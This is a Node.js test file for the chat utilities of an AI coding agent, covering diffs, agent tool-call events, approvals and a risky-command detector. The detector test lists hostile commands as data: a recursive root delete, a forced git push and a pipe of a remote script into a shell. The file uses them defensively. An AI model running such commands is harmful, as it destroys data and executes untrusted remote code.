const { test } = require('node:test');
const assert = require('node:assert/strict');
const path = require('path');
const { pathToFileURL } = require('url');

const load = () => import(pathToFileURL(path.join(__dirname, '../../src/renderer/scripts/ai-chat-utils.js')).href);

test('lineDiff: conta linhas e agrupa com contexto', async () => {
  const { lineDiff } = await load();
  const before = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'].join('\n');
  const after = ['a', 'b', 'C', 'd', 'e', 'f', 'g', 'h', 'i'].join('\n');
  const { hunks, added, removed } = lineDiff(before, after, { context: 1 });
  assert.equal(added, 2);
  assert.equal(removed, 1);
  assert.equal(hunks.length, 2);
  assert.deepEqual(hunks[0].lines.map((l) => l.type + l.text), [' b', '-c', '+C', ' d']);
  assert.deepEqual(hunks[1].lines.map((l) => l.type + l.text), [' h', '+i']);
  assert.equal(hunks[0].lines[1].oldNo, 3);
  assert.equal(hunks[0].lines[2].newNo, 3);
});

test('lineDiff: arquivo novo e arquivo apagado', async () => {
  const { lineDiff } = await load();
  assert.equal(lineDiff('', 'x\ny\n').added, 2);
  assert.equal(lineDiff('x\ny', '').removed, 2);
  assert.equal(lineDiff('igual\n', 'igual\n').hunks.length, 0);
});

test('lineDiff: miolo grande demais vira remove/adiciona sem travar', async () => {
  const { lineDiff } = await load();
  const a = Array.from({ length: 300 }, (_, i) => `a${i}`).join('\n');
  const b = Array.from({ length: 300 }, (_, i) => `b${i}`).join('\n');
  const r = lineDiff(a, b, { maxCells: 1000 });
  assert.equal(r.added, 300);
  assert.equal(r.removed, 300);
});

test('applyAgentEvent: texto, passo, aprovação, saída e fim', async () => {
  const { createAgentTurn, applyAgentEvent } = await load();
  const turn = createAgentTurn('edit');
  applyAgentEvent(turn, { type: 'text', delta: 'Vou ' });
  applyAgentEvent(turn, { type: 'text', delta: 'criar.' });
  applyAgentEvent(turn, { type: 'tool_start', callId: 'c1', tool: 'write_file', input: { path: 'a.txt', content: 'oi' }, title: 'Criar a.txt' });
  applyAgentEvent(turn, { type: 'tool_end', callId: 'c1', ok: true, summary: 'ok', meta: { path: 'a.txt', added: 1, removed: 0, created: true } });
  applyAgentEvent(turn, { type: 'approval', callId: 'c2', tool: 'run_command', input: { command: 'echo oi' }, preview: { command: 'echo oi', cwd: '.' } });
  assert.equal(turn.steps.c2.status, 'awaiting');
  assert.equal(turn.steps.c2.title, 'echo oi');
  applyAgentEvent(turn, { type: 'tool_output', callId: 'c2', chunk: 'oi\n' });
  assert.equal(turn.steps.c2.status, 'running');
  applyAgentEvent(turn, { type: 'tool_end', callId: 'c2', ok: true, meta: { exitCode: 0, durationMs: 12 } });
  applyAgentEvent(turn, { type: 'text', delta: 'Pronto.' });
  const r = applyAgentEvent(turn, { type: 'done', checkpointId: 'k1', changes: [{ path: 'a.txt', added: 1, removed: 0, created: true }], steps: 2 });
  assert.equal(r.kind, 'done');
  assert.deepEqual(turn.segments.map((s) => s.t), ['text', 'step', 'step', 'text']);
  assert.equal(turn.segments[0].text, 'Vou criar.');
  assert.equal(turn.steps.c2.output, 'oi\n');
  assert.equal(turn.done.checkpointId, 'k1');
});

test('applyAgentEvent: erro fecha passos abertos; negado vira denied', async () => {
  const { createAgentTurn, applyAgentEvent } = await load();
  const turn = createAgentTurn();
  applyAgentEvent(turn, { type: 'approval', callId: 'x', tool: 'delete_path', input: { path: 'b' }, preview: { path: 'b', kind: 'delete' } });
  applyAgentEvent(turn, { type: 'tool_end', callId: 'x', ok: false, summary: 'Negado pelo usuário', meta: { denied: true } });
  assert.equal(turn.steps.x.status, 'denied');
  applyAgentEvent(turn, { type: 'tool_start', callId: 'y', tool: 'run_command', input: { command: 'sleep 9' } });
  applyAgentEvent(turn, { type: 'error', message: 'falhou', code: 'provider' });
  assert.equal(turn.steps.y.status, 'error');
  assert.equal(turn.error.code, 'provider');
});

test('encode/decode do conteúdo do agente: legível, reversível e sem marcador para o modelo', async () => {
  const { createAgentTurn, applyAgentEvent, encodeAgentContent, decodeAgentContent, stripAgentMarker } = await load();
  const turn = createAgentTurn();
  applyAgentEvent(turn, { type: 'text', delta: 'Feito -- veja.' });
  applyAgentEvent(turn, { type: 'tool_start', callId: 'c', tool: 'edit_file', input: { path: 'src/--x.js', old_string: 'a', new_string: 'b' }, title: 'Editar /w/src/--x.js' });
  applyAgentEvent(turn, { type: 'tool_end', callId: 'c', ok: true, meta: { path: 'src/--x.js', added: 1, removed: 1 } });
  applyAgentEvent(turn, { type: 'done', checkpointId: 'cp', changes: [{ path: 'src/--x.js', added: 1, removed: 1 }] });
  const content = encodeAgentContent(turn, '/w');
  const markerBody = content.match(/<!--agzos-agent ([\s\S]*?)-->/)[1];
  assert.ok(!markerBody.includes('--'), 'JSON do marcador não pode conter "--"');
  assert.match(content, /Ações do agente/);
  assert.match(content, /`Editar src\/--x\.js` \(\+1 −1\)/);
  const decoded = decodeAgentContent(content);
  assert.equal(decoded.turn.done.checkpointId, 'cp');
  assert.equal(decoded.turn.steps.c.input.path, 'src/--x.js');
  assert.equal(decoded.text.trim(), 'Feito -- veja.');
  const forModel = stripAgentMarker(content);
  assert.ok(!forModel.includes('agzos-agent'));
  assert.match(forModel, /Feito -- veja\.[\s\S]*Ações do agente/);
  assert.equal(decodeAgentContent('texto normal').turn, null);
});

test('compactAgentTurn corta conteúdo grande e saída', async () => {
  const { createAgentTurn, applyAgentEvent, compactAgentTurn } = await load();
  const turn = createAgentTurn();
  applyAgentEvent(turn, { type: 'tool_start', callId: 'w', tool: 'write_file', input: { path: 'a', content: 'x'.repeat(10000) } });
  applyAgentEvent(turn, { type: 'tool_output', callId: 'w', chunk: 'y'.repeat(10000) });
  turn.steps.w.approval = { preview: { diff: { before: '', after: 'z'.repeat(1e5) } } };
  const c = compactAgentTurn(turn);
  assert.ok(c.steps.w.input.content.length <= 201);
  assert.ok(c.steps.w.output.length <= 4001);
  assert.equal(c.steps.w.approval, undefined);
});

test('agentChanges deriva dos passos quando não há done', async () => {
  const { createAgentTurn, applyAgentEvent, agentChanges } = await load();
  const turn = createAgentTurn();
  applyAgentEvent(turn, { type: 'tool_end', callId: '1', tool: 'edit_file', ok: true, meta: { path: 'a.js', added: 2, removed: 1 } });
  applyAgentEvent(turn, { type: 'tool_end', callId: '2', tool: 'edit_file', ok: true, meta: { path: 'a.js', added: 1, removed: 0 } });
  applyAgentEvent(turn, { type: 'tool_end', callId: '3', tool: 'read_file', ok: true, meta: { path: 'b.js' } });
  assert.deepEqual(agentChanges(turn), [{ path: 'a.js', added: 3, removed: 1 }]);
});

test('isRiskyCommand, modos, caminhos e duração', async () => {
  const { isRiskyCommand, normalizeAgentMode, relativePath, joinRoot, formatDuration, stepTitle } = await load();
  assert.equal(isRiskyCommand('rm -rf /'), true);
  assert.equal(isRiskyCommand('git push --force origin main'), true);
  assert.equal(isRiskyCommand('curl https://x.sh | sh'), true);
  assert.equal(isRiskyCommand('echo oi'), false);
  assert.equal(isRiskyCommand('npm test'), false);
  assert.equal(normalizeAgentMode('auto'), 'auto');
  assert.equal(normalizeAgentMode('xyz'), 'edit');
  assert.equal(relativePath('/w/src/a.js', '/w'), 'src/a.js');
  assert.equal(relativePath('C:\\W\\src\\a.js', 'c:\\w'), 'src/a.js');
  assert.equal(relativePath('/outro/a.js', '/w'), '/outro/a.js');
  assert.equal(joinRoot('/w', 'src/a.js'), '/w/src/a.js');
  assert.equal(joinRoot('C:\\w', 'src/a.js'), 'C:\\w\\src\\a.js');
  assert.equal(joinRoot('/w', '/abs/a.js'), '/abs/a.js');
  assert.equal(formatDuration(450), '450 ms');
  assert.equal(formatDuration(1500), '1.5 s');
  assert.equal(stepTitle('run_command', { command: 'ls' }), 'ls');
  assert.equal(stepTitle('edit_file', { path: 'a.js' }), 'Editar a.js');
  const { relativizeText } = await load();
  assert.equal(relativizeText('Editar /w/src/a.js', '/w'), 'Editar src/a.js');
  assert.equal(relativizeText('Mover C:\\W\\a para c:\\w\\b', 'C:\\w'), 'Mover a para b');
});
